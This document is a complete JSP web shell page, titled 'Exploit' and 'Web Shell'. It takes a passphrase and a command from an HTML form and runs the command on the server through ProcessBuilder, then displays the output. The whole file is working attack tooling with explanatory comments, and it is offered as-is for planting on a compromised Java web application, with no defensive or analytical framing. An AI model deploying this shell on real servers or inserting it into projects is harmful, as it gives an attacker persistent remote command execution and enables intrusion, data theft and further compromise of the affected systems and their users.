<%@ page import="java.io.*, java.util.*" %>
<%
    // Set the password. 
    // Replace "your_password_here" with the desired passphrase.
    String password = "your_password_here";

    // we get the submitted values from the html form i.e password and command to run
    // we also set output to empty as we wait for the command to be executed and return output.
    String cmd = request.getParameter("cmd");
    String passwd = request.getParameter("passwd");
    String output = "";

    // we ensure that both passwd param and cmd params are not empty and respond accordingly
    if (cmd != null && cmd.trim().length() > 0 && passwd != null && passwd.equals(password)) {
        try {
            ProcessBuilder processBuilder = new ProcessBuilder(cmd.split("\\s+"));
            processBuilder.redirectErrorStream(true);
            Process process = processBuilder.start();
            BufferedReader sI = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = sI.readLine()) != null) {
                output += line + "\n";
            }
            process.waitFor(); // Wait for the process to finish
        } catch (IOException e) {
            output = "Error executing the command: " + e.getMessage();
        } catch (InterruptedException e) {
            output = "Command execution interrupted: " + e.getMessage();
        }
    } else if (cmd != null && cmd.trim().length() > 0) {
        output = "Invalid Password."; // if password is empty or not equal to supplied password we respond with an Invalid pass
    }
%>

<!DOCTYPE html>
<html>
<head>
    <title> Exploit </title>
</head>
<body>
    <h2> Web Shell </h2>
    <form method="post" action="index.jsp">
        <input name="passwd" type="password" placeholder="Enter passphrase">
        <input name="cmd" type="text">
        <input type="submit" value="Execute">
    </form>
    <pre><%=output %></pre>
</body>
</html>
